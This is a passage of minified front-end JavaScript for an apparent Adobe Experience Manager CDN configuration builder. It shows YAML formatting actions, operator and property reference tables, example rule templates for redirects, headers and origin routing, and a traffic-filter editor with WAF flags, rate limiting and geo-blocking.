24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,i.jsx)("line",{x1:"15",y1:"9",x2:"9",y2:"15"}),(0,i.jsx)("line",{x1:"9",y1:"9",x2:"15",y2:"15"})]}),(0,i.jsxs)("div",{children:[(0,i.jsx)("span",{children:N.text}),N.details&&(0,i.jsx)("span",{className:"format-message-details",children:N.details})]})]}),(0,i.jsxs)("div",{className:"format-actions-grid",children:[(0,i.jsxs)("button",{className:"format-action-btn primary",onClick:()=>{try{if(S(null),!e.trim())return void S({type:"error",text:"No YAML content to format"});const n=ct.load(e),r=ct.dump(n,{indent:2,lineWidth:120,noRefs:!0,sortKeys:!1,quotingType:'"',forceQuotes:!1});t(r),S({type:"success",text:"YAML formatted successfully!"})}catch(n){S({type:"error",text:"Format failed: ".concat(n.message),details:n.mark?"Error at line ".concat(n.mark.line+1,", column ").concat(n.mark.column+1):null})}},children:[(0,i.jsx)("div",{className:"format-action-icon",children:(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M4 7V4h16v3"}),(0,i.jsx)("path",{d:"M9 20h6"}),(0,i.jsx)("path",{d:"M12 4v16"})]})}),(0,i.jsxs)("div",{className:"format-action-content",children:[(0,i.jsx)("span",{className:"format-action-title",children:"Format / Prettify"}),(0,i.jsx)("span",{className:"format-action-desc",children:"Auto-indent and format YAML structure"})]})]}),(0,i.jsxs)("button",{className:"format-action-btn",onClick:()=>{try{if(S(null),!e.trim())return void S({type:"error",text:"No YAML content to minify"});const n=ct.load(e),r=ct.dump(n,{indent:2,lineWidth:-1,flowLevel:2,noRefs:!0});t(r),S({type:"success",text:"YAML minified successfully!"})}catch(n){S({type:"error",text:"Minify failed: ".concat(n.message)})}},children:[(0,i.jsx)("div",{className:"format-action-icon",children:(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M4 4h16v16H4z"}),(0,i.jsx)("path",{d:"M9 9h6v6H9z"})]})}),(0,i.jsxs)("div",{className:"format-action-content",children:[(0,i.jsx)("span",{className:"format-action-title",children:"Compact / Minify"}),(0,i.jsx)("span",{className:"format-action-desc",children:"Use inline format where possible"})]})]}),(0,i.jsxs)("button",{className:"format-action-btn",onClick:()=>{try{var n,r,a,i,s,o,l,c,u,d;S(null);const p=ct.load(e);null!==p&&void 0!==p&&null!==(n=p.data)&&void 0!==n&&null!==(r=n.trafficFilters)&&void 0!==r&&r.rules&&p.data.trafficFilters.rules.sort((e,t)=>(e.name||"").localeCompare(t.name||"")),null!==p&&void 0!==p&&null!==(a=p.data)&&void 0!==a&&null!==(i=a.requestTransformations)&&void 0!==i&&i.rules&&p.data.requestTransformations.rules.sort((e,t)=>(e.name||"").localeCompare(t.name||"")),null!==p&&void 0!==p&&null!==(s=p.data)&&void 0!==s&&null!==(o=s.responseTransformations)&&void 0!==o&&o.rules&&p.data.responseTransformations.rules.sort((e,t)=>(e.name||"").localeCompare(t.name||"")),null!==p&&void 0!==p&&null!==(l=p.data)&&void 0!==l&&null!==(c=l.redirects)&&void 0!==c&&c.rules&&p.data.redirects.rules.sort((e,t)=>(e.name||"").localeCompare(t.name||"")),null!==p&&void 0!==p&&null!==(u=p.data)&&void 0!==u&&null!==(d=u.originSelectors)&&void 0!==d&&d.rules&&p.data.originSelectors.rules.sort((e,t)=>(e.name||"").localeCompare(t.name||""));const h=ct.dump(p,{indent:2,lineWidth:120});t(h),S({type:"success",text:"Rules sorted alphabetically by name!"})}catch(p){S({type:"error",text:"Sort failed: ".concat(p.message)})}},children:[(0,i.jsx)("div",{className:"format-action-icon",children:(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M11 5h10"}),(0,i.jsx)("path",{d:"M11 9h7"}),(0,i.jsx)("path",{d:"M11 13h4"}),(0,i.jsx)("path",{d:"M3 17l3 3 3-3"}),(0,i.jsx)("path",{d:"M6 18V4"})]})}),(0,i.jsxs)("div",{className:"format-action-content",children:[(0,i.jsx)("span",{className:"format-action-title",children:"Sort Rules A-Z"}),(0,i.jsx)("span",{className:"format-action-desc",children:"Sort rules alphabetically by name"})]})]}),(0,i.jsxs)("button",{className:"format-action-btn",onClick:async()=>{try{await navigator.clipboard.writeText(e),S({type:"success",text:"Copied to clipboard!"})}catch(t){S({type:"error",text:"Failed to copy to clipboard"})}},children:[(0,i.jsx)("div",{className:"format-action-icon",children:(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("rect",{x:"9",y:"9",width:"13",height:"13",rx:"2",ry:"2"}),(0,i.jsx)("path",{d:"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"})]})}),(0,i.jsxs)("div",{className:"format-action-content",children:[(0,i.jsx)("span",{className:"format-action-title",children:"Copy to Clipboard"}),(0,i.jsx)("span",{className:"format-action-desc",children:"Copy formatted YAML to clipboard"})]})]})]}),(0,i.jsxs)("div",{className:"format-tips",children:[(0,i.jsx)("h4",{children:"\ud83d\udca1 Formatting Tips"}),(0,i.jsxs)("ul",{children:[(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Standard Indentation:"})," Uses 2 spaces per level (Adobe standard)"]}),(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Inline Objects:"})," Short conditions are formatted inline: ",(0,i.jsx)("code",{children:'{ reqProperty: path, equals: "/" }'})]}),(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Multi-line:"})," Complex conditions expand to multiple lines for readability"]}),(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Comments:"})," Comments are preserved during formatting"]})]})]}),(0,i.jsxs)("div",{className:"format-valid-types",children:[(0,i.jsx)("h4",{children:"\ud83d\udccb Valid Action Types by Configuration"}),(0,i.jsxs)("div",{className:"valid-types-grid",children:[(0,i.jsxs)("div",{className:"valid-type-card",children:[(0,i.jsx)("h5",{children:"Traffic Filters"}),(0,i.jsx)("div",{className:"type-badges",children:["allow","block","log","authenticate"].map(e=>(0,i.jsx)("code",{className:"type-badge",children:e},e))})]}),(0,i.jsxs)("div",{className:"valid-type-card",children:[(0,i.jsx)("h5",{children:"Request Transformations"}),(0,i.jsx)("div",{className:"type-badges",children:["set","unset","transform"].map(e=>(0,i.jsx)("code",{className:"type-badge",children:e},e))})]}),(0,i.jsxs)("div",{className:"valid-type-card",children:[(0,i.jsx)("h5",{children:"Response Transformations"}),(0,i.jsx)("div",{className:"type-badges",children:["set","unset"].map(e=>(0,i.jsx)("code",{className:"type-badge",children:e},e))})]}),(0,i.jsxs)("div",{className:"valid-type-card",children:[(0,i.jsx)("h5",{children:"Redirects"}),(0,i.jsx)("div",{className:"type-badges",children:["redirect"].map(e=>(0,i.jsx)("code",{className:"type-badge",children:e},e))}),(0,i.jsxs)("div",{className:"type-badges",style:{marginTop:"8px"},children:[(0,i.jsx)("span",{className:"type-label",children:"Status:"}),[301,302,303,307,308].map(e=>(0,i.jsx)("code",{className:"type-badge",children:e},e))]})]}),(0,i.jsxs)("div",{className:"valid-type-card",children:[(0,i.jsx)("h5",{children:"Origin Selectors"}),(0,i.jsx)("div",{className:"type-badges",children:["selectOrigin","selectAemOrigin"].map(e=>(0,i.jsx)("code",{className:"type-badge",children:e},e))})]}),(0,i.jsxs)("div",{className:"valid-type-card",children:[(0,i.jsx)("h5",{children:"Transform Operations"}),(0,i.jsx)("div",{className:"type-badges",children:["replace","tolower","toupper"].map(e=>(0,i.jsx)("code",{className:"type-badge",children:e},e))})]})]})]})]})]})]})]})};function St(e){return St="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},St(e)}function Ct(e){var t=function(e,t){if("object"!=St(e)||!e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var r=n.call(e,t||"default");if("object"!=St(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}(e,"string");return"symbol"==St(t)?t:t+""}function At(e,t,n){return(t=Ct(t))in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function Pt(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),n.push.apply(n,r)}return n}function Tt(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?Pt(Object(n),!0).forEach(function(t){At(e,t,n[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):Pt(Object(n)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))})}return e}const qt={trafficFilter:{name:"Traffic Filter Rules",description:"Control what traffic is allowed or denied by the CDN. Includes WAF rules for attack protection.",icon:"shield",category:"Security",license:"Standard (WAF requires Extended Security)",examples:["Block IP addresses","Rate limiting","Geo-blocking","WAF protection"]},requestTransformations:{name:"Request Transformations",description:"Modify incoming requests including headers, paths, query parameters, and cookies.",icon:"edit",category:"Transform",license:"Standard",examples:["URL rewriting","Header manipulation","Query parameter filtering","Marketing parameter removal"]},responseTransformations:{name:"Response Transformations",description:"Modify outgoing responses including headers and cookies before sending to the client.",icon:"arrow-right",category:"Transform",license:"Standard",examples:["Set security headers","CORS headers","Cache headers","Cookie management"]},redirects:{name:"Server-side Redirects",description:"Trigger browser redirects (301, 302, etc.) at the CDN layer for fast, efficient redirects.",icon:"external-link",category:"Routing",license:"Standard",examples:["Domain redirects","Path redirects","Country-based redirects","HTTPS enforcement"]},originSelectors:{name:"Origin Selectors",description:"Route traffic to different backend origins based on request properties.",icon:"git-branch",category:"Routing",license:"Standard",examples:["Proxy to external APIs","Edge Delivery Services","Static content routing","A/B testing"]}},Et={equals:{name:"equals",description:"Exact string match",example:'{ reqProperty: path, equals: "/admin" }',valueType:"string"},notEquals:{name:"notEquals",description:"Does not equal the value",example:'{ reqProperty: tier, notEquals: "author" }',valueType:"string"},like:{name:"like",description:"Wildcard pattern match (* for any characters)",example:'{ reqProperty: path, like: "/api/*" }',valueType:"string"},notLike:{name:"notLike",description:"Does not match wildcard pattern",example:'{ reqProperty: path, notLike: "*.html" }',valueType:"string"},matches:{name:"matches",description:"Regular expression match (Java regex syntax)",example:'{ reqProperty: path, matches: "^/content/.*\\.json$" }',valueType:"regex"},doesNotMatch:{name:"doesNotMatch",description:"Does not match regular expression",example:'{ reqProperty: path, doesNotMatch: "^/api/.*" }',valueType:"regex"},in:{name:"in",description:"Value is in provided list",example:'{ reqProperty: clientCountry, in: ["US", "CA", "GB"] }',valueType:"array"},notIn:{name:"notIn",description:"Value is not in provided list",example:'{ reqProperty: method, notIn: ["GET", "HEAD"] }',valueType:"array"},exists:{name:"exists",description:"Property exists (true/false)",example:"{ reqHeader: Authorization, exists: true }",valueType:"boolean"}},Lt={path:{name:"path",description:"Request URI path without query string",example:"/content/dam/image.jpg",category:"URL"},queryString:{name:"queryString",description:"Query string portion of the URL",example:"?id=123&sort=asc",category:"URL"},url:{name:"url",description:"Full request URL including query string",example:"/page.html?ref=home",category:"URL"},method:{name:"method",description:"HTTP method (GET, POST, PUT, DELETE, etc.)",example:"GET",category:"Request"},tier:{name:"tier",description:'AEM tier - "author" or "publish"',example:"publish",category:"AEM"},domain:{name:"domain",description:"Request domain/hostname",example:"www.example.com",category:"URL"},clientIp:{name:"clientIp",description:"Client IP address (supports CIDR notation)",example:"192.168.1.100 or 10.0.0.0/8",category:"Client"},clientCountry:{name:"clientCountry",description:"ISO 3166-1 alpha-2 country code",example:"US",category:"Client"},clientAsn:{name:"clientAsn",description:"Autonomous System Number of client network",example:"15169 (Google)",category:"Client"},userAgent:{name:"userAgent",description:"User-Agent header value",example:"Mozilla/5.0...",category:"Headers"}},Rt=[{code:301,name:"Moved Permanently",description:"Permanent redirect, browsers cache this"},{code:302,name:"Found",description:"Temporary redirect, not cached by default"},{code:303,name:"See Other",description:"Redirect after POST, forces GET method"},{code:307,name:"Temporary Redirect",description:"Temporary, preserves request method"},{code:308,name:"Permanent Redirect",description:"Permanent, preserves request method"}],Ot={hsts:{name:"HSTS (HTTP Strict Transport Security)",header:"Strict-Transport-Security",value:"max-age=31536000; includeSubDomains",description:"Force HTTPS connections for 1 year"},nosniff:{name:"X-Content-Type-Options",header:"X-Content-Type-Options",value:"nosniff",description:"Prevent MIME type sniffing"},xss:{name:"X-XSS-Protection",header:"X-XSS-Protection",value:"1; mode=block",description:"Enable browser XSS filtering"},frame:{name:"X-Frame-Options",header:"X-Frame-Options",value:"SAMEORIGIN",description:"Prevent clickjacking attacks"},csp:{name:"Content Security Policy",header:"Content-Security-Policy",value:"default-src 'self'",description:"Restrict resource loading sources"}},Ft={removeMarketingParams:{type:"requestTransformations",name:"Remove Marketing Parameters",description:"Remove common marketing/tracking query parameters to improve cache hit ratio",yaml:"requestTransformations:\n  removeMarketingParams: true",explanation:"Built-in feature that removes common UTM and tracking parameters"},urlRewrite:{type:"requestTransformations",name:"URL Rewrite (.html removal)",description:"Remove .html extension from URLs for cleaner paths",yaml:'requestTransformations:\n  rules:\n    - name: remove-html-extension\n      when:\n        reqProperty: path\n        like: "*.html"\n      actions:\n        - type: transform\n          reqProperty: path\n          op: replace\n          match: \'\\.html$\'\n          replacement: ""',explanation:"Transforms /page.html to /page using regex replacement"},setCustomHeader:{type:"requestTransformations",name:"Set Custom Request Header",description:"Add a custom header to incoming requests",yaml:'requestTransformations:\n  rules:\n    - name: set-custom-header\n      when:\n        reqProperty: path\n        like: "/api/*"\n      actions:\n        - type: set\n          reqHeader: X-Custom-Header\n          value: "custom-value"',explanation:"Sets a custom header on all API requests"},extractCountryCode:{type:"requestTransformations",name:"Extract Country from Path",description:"Extract country code from path and store in variable",yaml:'requestTransformations:\n  rules:\n    - name: extract-country-code\n      when:\n        reqProperty: path\n        matches: "^/([a-zA-Z]{2})(/.*|$)"\n      actions:\n        - type: set\n          var: country-code\n          value:\n            reqProperty: path\n        - type: transform\n          var: country-code\n          op: replace\n          match: "^/([a-zA-Z]{2})(/.*|$)"\n          replacement: "\\1"',explanation:"Extracts country code from /us/page to variable for later use"},corsHeaders:{type:"responseTransformations",name:"CORS Headers",description:"Add Cross-Origin Resource Sharing headers",yaml:'responseTransformations:\n  rules:\n    - name: add-cors-headers\n      when:\n        reqProperty: path\n        like: "/api/*"\n      actions:\n        - type: set\n          respHeader: Access-Control-Allow-Origin\n          value: "*"\n        - type: set\n          respHeader: Access-Control-Allow-Methods\n          value: "GET, POST, OPTIONS"\n        - type: set\n          respHeader: Access-Control-Allow-Headers\n          value: "Content-Type, Authorization"',explanation:"Enables cross-origin requests for API endpoints"},securityHeaders:{type:"responseTransformations",name:"Security Headers",description:"Add recommended security headers to responses",yaml:'responseTransformations:\n  rules:\n    - name: security-headers\n      when: { reqProperty: tier, equals: publish }\n      actions:\n        - type: set\n          respHeader: X-Content-Type-Options\n          value: "nosniff"\n        - type: set\n          respHeader: X-Frame-Options\n          value: "SAMEORIGIN"\n        - type: set\n          respHeader: X-XSS-Protection\n          value: "1; mode=block"\n        - type: set\n          respHeader: Strict-Transport-Security\n          value: "max-age=31536000; includeSubDomains"',explanation:"Adds essential security headers to prevent common attacks"},setCacheHeaders:{type:"responseTransformations",name:"Cache Control Headers",description:"Set caching headers for static assets",yaml:'responseTransformations:\n  rules:\n    - name: cache-static-assets\n      when:\n        reqProperty: path\n        matches: "\\.(css|js|png|jpg|gif|svg|woff2?)$"\n      actions:\n        - type: set\n          respHeader: Cache-Control\n          value: "public, max-age=31536000, immutable"',explanation:"Sets long cache for static assets (1 year)"},wwwRedirect:{type:"redirects",name:"WWW Redirect",description:"Redirect non-www to www domain",yaml:'redirects:\n  rules:\n    - name: www-redirect\n      when:\n        reqProperty: domain\n        equals: "example.com"\n      action:\n        type: redirect\n        status: 301\n        location:\n          reqProperty: url\n          transform:\n            - op: replace\n              match: "^(.*)$"\n              replacement: "https://www.example.com\\1"',explanation:"Redirects example.com to www.example.com preserving path"},httpsRedirect:{type:"redirects",name:"HTTPS Redirect",description:"Redirect HTTP to HTTPS",yaml:'redirects:\n  rules:\n    - name: https-redirect\n      when:\n        reqHeader: X-Forwarded-Proto\n        equals: "http"\n      action:\n        type: redirect\n        status: 301\n        location: "https://{reqProperty: domain}{reqProperty: url}"',explanation:"Forces all traffic to use HTTPS"},countryRedirect:{type:"redirects",name:"Country-based Redirect",description:"Redirect users to country-specific pages",yaml:'redirects:\n  rules:\n    - name: country-redirect\n      when:\n        allOf:\n          - { reqProperty: path, equals: "/" }\n          - { reqProperty: clientCountry, in: ["DE", "AT", "CH"] }\n      action:\n        type: redirect\n        status: 302\n        location: "/de/home"',explanation:"Redirects German-speaking countries to German homepage"},pathRedirect:{type:"redirects",name:"Legacy Path Redirect",description:"Redirect old URLs to new structure",yaml:'redirects:\n  rules:\n    - name: legacy-redirect\n      when:\n        reqProperty: path\n        like: "/old-section/*"\n      action:\n        type: redirect\n        status: 301\n        location:\n          reqProperty: path\n          transform:\n            - op: replace\n              match: "^/old-section/(.*)$"\n              replacement: "/new-section/\\1"',explanation:"Maps old URL structure to new paths"},apiProxy:{type:"originSelectors",name:"API Proxy",description:"Proxy API requests to external backend",yaml:'originSelectors:\n  rules:\n    - name: api-proxy\n      when:\n        reqProperty: path\n        like: "/api/external/*"\n      action:\n        type: selectOrigin\n        originName: external-api\n  origins:\n    - name: external-api\n      domain: api.external-service.com\n      forwardHost: false\n      forwardAuthorization: true\n      timeout: 30',explanation:"Routes /api/external/* to external API backend"},edgeDelivery:{type:"originSelectors",name:"Edge Delivery Services",description:"Route static assets to Edge Delivery Services",yaml:'originSelectors:\n  rules:\n    - name: edge-delivery\n      when:\n        allOf:\n          - { reqProperty: tier, equals: publish }\n          - reqProperty: path\n            matches: "^(/scripts/.*|/styles/.*|/fonts/.*|/blocks/.*|/icons/.*)"\n      action:\n        type: selectOrigin\n        originName: aem-live\n  origins:\n    - name: aem-live\n      domain: main--repo--owner.aem.live',explanation:"Routes front-end assets to Edge Delivery Services"},staticOrigin:{type:"originSelectors",name:"AEM Static Origin",description:"Route to AEM static content tier",yaml:'originSelectors:\n  rules:\n    - name: static-assets\n      when:\n        reqProperty: path\n        like: "/static/*"\n      action:\n        type: selectAemOrigin\n        originName: static',explanation:"Routes to AEM static tier for front-end pipeline content"}},It={simple:{name:"Simple Condition",yaml:'when:\n  reqProperty: path\n  equals: "/admin"',explanation:"Single property match"},allOf:{name:"AND Conditions (allOf)",yaml:'when:\n  allOf:\n    - { reqProperty: tier, equals: publish }\n    - { reqProperty: path, like: "/api/*" }\n    - { reqProperty: method, in: ["GET", "POST"] }',explanation:"ALL conditions must match"},anyOf:{name:"OR Conditions (anyOf)",yaml:'when:\n  anyOf:\n    - { reqProperty: path, like: "/admin/*" }\n    - { reqProperty: path, like: "/console/*" }',explanation:"ANY condition must match"},nested:{name:"Nested Conditions",yaml:'when:\n  allOf:\n    - { reqProperty: tier, equals: publish }\n    - anyOf:\n        - { reqProperty: clientCountry, in: ["US", "CA"] }\n        - { reqHeader: X-Internal, equals: "true" }',explanation:"Complex nested AND/OR logic"},headerCondition:{name:"Header Condition",yaml:"when:\n  reqHeader: Authorization\n  exists: true",explanation:"Check if header exists"},queryParamCondition:{name:"Query Parameter Condition",yaml:'when:\n  queryParam: debug\n  equals: "true"',explanation:"Match specific query parameter value"},cookieCondition:{name:"Cookie Condition",yaml:"when:\n  reqCookie: session\n  exists: true",explanation:"Check if cookie exists"}},Mt=e=>{var t;let{rule:n,index:a,updateRule:s,deleteRule:o,duplicateRule:l,addCondition:c,updateCondition:u,deleteCondition:d,addAction:p,updateAction:h,deleteAction:f,toggleWafFlag:m}=e;const[g,y]=(0,r.useState)(n.expanded);return(0,i.jsxs)("div",{className:"rule-builder-card card",children:[(0,i.jsxs)("div",{className:"rule-builder-header",onClick:()=>y(!g),children:[(0,i.jsxs)("div",{className:"rule-builder-title",children:[(0,i.jsxs)("span",{className:"rule-number",children:["#",a+1]}),(0,i.jsx)("input",{type:"text",className:"rule-name-input",value:n.name,onChange:e=>s(n.id,{name:e.target.value.replace(/[^a-zA-Z0-9-_]/g,"")}),onClick:e=>e.stopPropagation(),placeholder:"rule-name",maxLength:64}),(0,i.jsx)("span",{className:"badge badge-".concat(n.type),children:n.type})]}),(0,i.jsxs)("div",{className:"rule-builder-actions",children:[(0,i.jsx)("button",{className:"btn btn-ghost btn-icon",onClick:e=>{e.stopPropagation(),l(n.id)},children:(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("rect",{x:"9",y:"9",width:"13",height:"13",rx:"2",ry:"2"}),(0,i.jsx)("path",{d:"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"})]})}),(0,i.jsx)("button",{className:"btn btn-ghost btn-icon delete",onClick:e=>{e.stopPropagation(),o(n.id)},children:(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("polyline",{points:"3 6 5 6 21 6"}),(0,i.jsx)("path",{d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"})]})}),(0,i.jsx)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",style:{transform:g?"rotate(180deg)":"none",transition:"transform 0.2s"},children:(0,i.jsx)("polyline",{points:"6 9 12 15 18 9"})})]})]}),g&&(0,i.jsxs)("div",{className:"rule-builder-body animate-slide-up",children:[(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsxs)("div",{className:"section-header",children:[(0,i.jsx)("h4",{children:"When Conditions"}),(0,i.jsxs)("select",{className:"form-select-inline",value:n.conditionLogic,onChange:e=>s(n.id,{conditionLogic:e.target.value}),children:[(0,i.jsx)("option",{value:"allOf",children:"ALL match (AND)"}),(0,i.jsx)("option",{value:"anyOf",children:"ANY match (OR)"})]})]}),null===(t=n.conditions)||void 0===t?void 0:t.map((e,t)=>(0,i.jsxs)("div",{className:"condition-row",children:[(0,i.jsxs)("select",{className:"form-select",value:e.propertyType,onChange:t=>u(n.id,e.id,{propertyType:t.target.value}),children:[(0,i.jsx)("option",{value:"reqProperty",children:"Request Property"}),(0,i.jsx)("option",{value:"reqHeader",children:"Request Header"}),(0,i.jsx)("option",{value:"queryParam",children:"Query Parameter"}),(0,i.jsx)("option",{value:"reqCookie",children:"Cookie"})]}),"reqProperty"===e.propertyType?(0,i.jsx)("select",{className:"form-select",value:e.property,onChange:t=>u(n.id,e.id,{property:t.target.value}),children:Object.entries(Lt).map(e=>{let[t,n]=e;return(0,i.jsxs)("option",{value:t,children:[n.name," - ",n.description]},t)})}):(0,i.jsx)("input",{type:"text",className:"form-input",value:e.property,onChange:t=>u(n.id,e.id,{property:t.target.value}),placeholder:"reqHeader"===e.propertyType?"Header-Name":"param-name"}),(0,i.jsx)("select",{className:"form-select",value:e.operator,onChange:t=>u(n.id,e.id,{operator:t.target.value}),children:Object.entries(Et).map(e=>{let[t,n]=e;return(0,i.jsx)("option",{value:t,children:n.name},t)})}),"exists"!==e.operator&&(0,i.jsx)("input",{type:"text",className:"form-input",value:e.value,onChange:t=>u(n.id,e.id,{value:t.target.value}),placeholder:"in"===e.operator?"value1, value2":"value"}),n.conditions.length>1&&(0,i.jsx)("button",{className:"btn btn-ghost btn-icon delete",onClick:()=>d(n.id,e.id),children:(0,i.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),(0,i.jsx)("line",{x1:"6",y1:"6",x2:"18",y2:"18"})]})})]},e.id)),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>c(n.id),children:"+ Add Condition"})]}),"trafficFilter"===n.type&&(0,i.jsx)(Dt,{rule:n,updateRule:s,toggleWafFlag:m}),("requestTransformations"===n.type||"responseTransformations"===n.type)&&(0,i.jsx)(_t,{rule:n,updateRule:s,addAction:p,updateAction:h,deleteAction:f}),"redirects"===n.type&&(0,i.jsx)(Bt,{rule:n,updateRule:s}),"originSelectors"===n.type&&(0,i.jsx)(zt,{rule:n,updateRule:s})]})]})},Dt=e=>{var t,n,r,a,s,o,l,c;let{rule:u,updateRule:d,toggleWafFlag:p}=e;return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsx)("h4",{children:"Action"}),(0,i.jsxs)("div",{className:"form-row",children:[(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Action Type"}),(0,i.jsx)("select",{className:"form-select",value:u.action,onChange:e=>d(u.id,{action:e.target.value}),children:yt.map(e=>(0,i.jsxs)("option",{value:e.value,children:[e.label," - ",e.description]},e.value))})]}),(0,i.jsx)("div",{className:"form-group",children:(0,i.jsxs)("label",{className:"form-checkbox",children:[(0,i.jsx)("input",{type:"checkbox",checked:u.alert,onChange:e=>d(u.id,{alert:e.target.checked})}),(0,i.jsx)("span",{children:"\ud83d\udd14 Alert Notifications"})]})})]})]}),(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsxs)("h4",{children:["WAF Protections ",(0,i.jsx)("span",{className:"license-badge",children:"Extended Security"})]}),(0,i.jsxs)("div",{className:"waf-quick-actions",children:[(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>d(u.id,{wafFlags:["ATTACK-FROM-BAD-IP","ATTACK"]}),children:"\u2b50 Adobe Recommended"}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>d(u.id,{wafFlags:Object.keys(pt).filter(e=>"critical"===pt[e].severity)}),children:"Critical Only"}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>d(u.id,{wafFlags:Object.keys(pt)}),children:"All Flags"}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>d(u.id,{wafFlags:[]}),children:"Clear"})]}),(0,i.jsx)("div",{className:"waf-flags-compact",children:Object.entries(pt).map(e=>{var t,n;let[r,a]=e;return(0,i.jsxs)("label",{className:"waf-chip ".concat(null!==(t=u.wafFlags)&&void 0!==t&&t.includes(r)?"selected":""),children:[(0,i.jsx)("input",{type:"checkbox",checked:null===(n=u.wafFlags)||void 0===n?void 0:n.includes(r),onChange:()=>p(u.id,r)}),(0,i.jsx)("span",{style:{background:ht[a.severity].bg,color:ht[a.severity].color},children:r})]},r)})})]}),(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsx)("h4",{children:"Rate Limiting"}),(0,i.jsxs)("div",{className:"form-row four-col",children:[(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Limit"}),(0,i.jsx)("input",{type:"number",className:"form-input",placeholder:"100",value:(null===(t=u.rateLimit)||void 0===t?void 0:t.limit)||"",onChange:e=>d(u.id,{rateLimit:Tt(Tt({},u.rateLimit),{},{limit:parseInt(e.target.value)||null})})})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Window (sec)"}),(0,i.jsx)("input",{type:"number",className:"form-input",placeholder:"10",value:(null===(n=u.rateLimit)||void 0===n?void 0:n.window)||"",onChange:e=>d(u.id,{rateLimit:Tt(Tt({},u.rateLimit),{},{window:parseInt(e.target.value)||null})})})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Count"}),(0,i.jsx)("select",{className:"form-select",value:(null===(r=u.rateLimit)||void 0===r?void 0:r.count)||"all",onChange:e=>d(u.id,{rateLimit:Tt(Tt({},u.rateLimit),{},{count:e.target.value})}),children:vt.map(e=>(0,i.jsx)("option",{value:e.value,children:e.label},e.value))})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{className:"form-label",children:"Penalty (sec)"}),(0,i.jsx)("input",{type:"number",className:"form-input",placeholder:"300",value:(null===(a=u.rateLimit)||void 0===a?void 0:a.penalty)||"",onChange:e=>d(u.id,{rateLimit:Tt(Tt({},u.rateLimit),{},{penalty:parseInt(e.target.value)||null})})})]})]})]}),(0,i.jsxs)("div",{className:"rule-section",children:[(0,i.jsx)("h4",{children:"Geo-Blocking"}),(0,i.jsxs)("label",{className:"form-checkbox",children:[(0,i.jsx)("input",{type:"checkbox",checked:null===(s=u.geoBlock)||void 0===s?void 0:s.enabled,onChange:e=>d(u.id,{geoBlock:Tt(Tt({},u.geoBlock),{},{enabled:e.target.checked})})}),(0,i.jsx)("span",{children:"Enable Country Blocking"})]}),(null===(o=u.geoBlock)||void 0===o?void 0:o.enabled)&&(0,i.jsxs)("div",{className:"geo-section",children:[(0,i.jsx)("button",{className:"btn btn-secondary btn-sm",onClick:()=>d(u.id,{geoBlock:Tt(Tt({},u.geoBlock),{},{countries:xt.map(e=>e.code)})}),children:"Add OFAC 